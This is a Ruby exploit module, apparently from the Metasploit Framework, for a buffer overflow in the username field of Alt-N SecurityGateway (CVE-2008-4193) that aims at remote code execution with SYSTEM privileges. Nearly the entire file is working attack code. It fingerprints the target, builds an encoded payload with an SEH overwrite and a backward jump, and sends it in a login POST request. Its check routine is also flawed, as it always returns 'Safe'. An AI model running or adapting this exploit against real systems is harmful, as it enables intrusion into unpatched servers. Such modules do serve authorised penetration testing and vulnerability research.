##
# $Id: altn_securitygateway.rb 9719 2010-07-07 17:38:59Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	# XXX: Automatic targetting used HttpFingerprint = { :uri => '/SecurityGateway.dll', :pattern => [ /SecurityGateway / ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Alt-N SecurityGateway username Buffer Overflow',
			'Description'    => %q{
					Alt-N SecurityGateway is prone to a buffer overflow condition. This
				is due to insufficient bounds checking on the "username"
				parameter. Successful exploitation could result in code
				execution with SYSTEM level privileges.

				NOTE: This service doesn't restart, you'll only get one shot. However,
				it often survives a successful exploitation attempt.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9719 $',
			'References'     =>
				[
					[ 'CVE', '2008-4193' ],
					[ 'OSVDB', '45854' ],
					[ 'BID', '29457']
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 476,
					# note: 0xd7 might not be translated, but w/e
					'BadChars' => "\x00" + ((0x40..0x5a).to_a + [ 0x8a, 0x8c, 0x8e, 0x9f ] + (0xc0..0xdf).to_a).pack('C*'),
					'StackAdjustment' => -3500,
					'EncoderType' => Msf::Encoder::Type::SingleStaticBit,
					'EncoderOptions' =>
						{
							'BitNumber' => 0x5,
							'BitValue' => true,
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic Targeting', { } ],
					# NOTE: the return address must be tolower() safe
					[ 'SecurityGateway 1.0.1 Universal', { 'Ret' => 0x6767756f }], # p/p/r in XceedZip.dll 4.5.77.0
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 02 2008'))

		register_options(
			[
				Opt::RPORT(4000)
			], self.class)
	end


	# Identify the target based on the SecurityGateway version number
	def auto_target
		info = http_fingerprint({ :uri => '/SecurityGateway.dll' })  # automatic targetting
		if (info =~ /SecurityGateway (1\..*)$/)
			case $1
			when /1\.0\.1/
				return self.targets[1]
			end
		end
		# Not vulnerable
		nil
	end

	def check
		if auto_target
			Exploit::CheckCode::Vulnerable
		end
		Exploit::CheckCode::Safe
	end

	def exploit

		# handle auto-targeting
		mytarget = target
		if target.name =~ /Automatic/
			print_status("Attempting to automatically select a target...")
			mytarget = auto_target
			if mytarget.nil?
				raise RuntimeError, "Unable to automatically select a target"
			end
			print_status("Automatically selected target \"#{mytarget.name}\"")
		end

		# the buffer gets CharLowerBuff()'d and passed to:
		# sprintf(str, "Attempt to login with invalid user name %s from %s", buf, ip_str);

		sploit = payload.encoded
		sploit << generate_seh_record(mytarget.ret)
		distance = payload_space + 8
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
		sploit = Rex::Text.to_hex(sploit, '%')
		sploit << rand_text_alphanumeric(512)

		post_data = 'RequestedPage=login'
		post_data << '&username=' << sploit
		post_data << '&passwd=world'

		print_status("Sending request...")
		res = send_request_cgi({
			'uri'          => '/SecurityGateway.dll',
			'method'       => 'POST',
			'content-type' => 'application/x-www-form-urlencoded',
			'data'         => post_data,
		}, 5)

		handler
	end

end